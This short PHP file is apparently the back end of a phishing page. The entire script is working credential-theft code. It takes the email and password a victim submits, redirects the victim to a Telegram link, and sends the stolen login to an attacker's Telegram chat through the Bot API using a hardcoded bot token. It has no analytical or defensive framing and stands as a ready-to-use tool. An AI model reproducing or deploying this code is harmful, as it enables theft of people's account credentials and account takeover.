<?php
header ('Location: https://t.me/EzZzZz ');
$API_KEY = "1219844886:AAFFkdvoq7ROkaPLbix0qClKC-H8H2mHjEE";#توكن البوت
$admin = 820130595;
$user = $_POST['email'];
$pass = $_POST['pass'];
$text = urlencode("Email : `$user`\nPass : `$pass`\n The index By @ThePHPbots");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>
